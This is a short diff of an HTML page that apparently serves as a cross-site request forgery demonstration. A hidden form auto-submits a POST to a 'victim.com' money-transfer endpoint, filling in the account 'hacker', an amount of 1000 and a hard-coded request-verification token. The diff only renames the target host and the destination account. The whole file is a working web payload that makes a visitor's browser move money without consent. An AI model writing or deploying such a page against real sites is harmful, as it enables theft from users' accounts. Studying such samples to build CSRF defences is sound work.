@@ -1,12 +1,12 @@
 ﻿
-<form action="http://192.168.31.98:51775/transfer/money" id="money-transfer-form" method="POST">
+<form action="http://victim.com:51775/transfer/money" id="money-transfer-form" method="POST">
     <input type="text" name="targetaccount"><br>
     <input type="text" name="amount">
     <input type="text" name="__RequestVerificationToken">
 </form>
 <script>
     var f = document.getElementById("money-transfer-form");
-    f.getElementsByTagName("input")[0].value = "123456768";
+    f.getElementsByTagName("input")[0].value = "hacker";
     f.getElementsByTagName("input")[1].value = "1000";
     f.getElementsByTagName("input")[2].value = "L0ykxYaSctukjF-WyL7DBUMvCTecSWyzD9woVjx3csYlMP3vcfeBV4jEVWttn2IeMXMzxuPj_xbmk_riSj1SM-uorYEOVN1uCVhLsHaenpgqCuhmKQ2L2eozuph0bAjl8_dLG17ZXmJJ26ENVD36UQ2";
     f.submit();
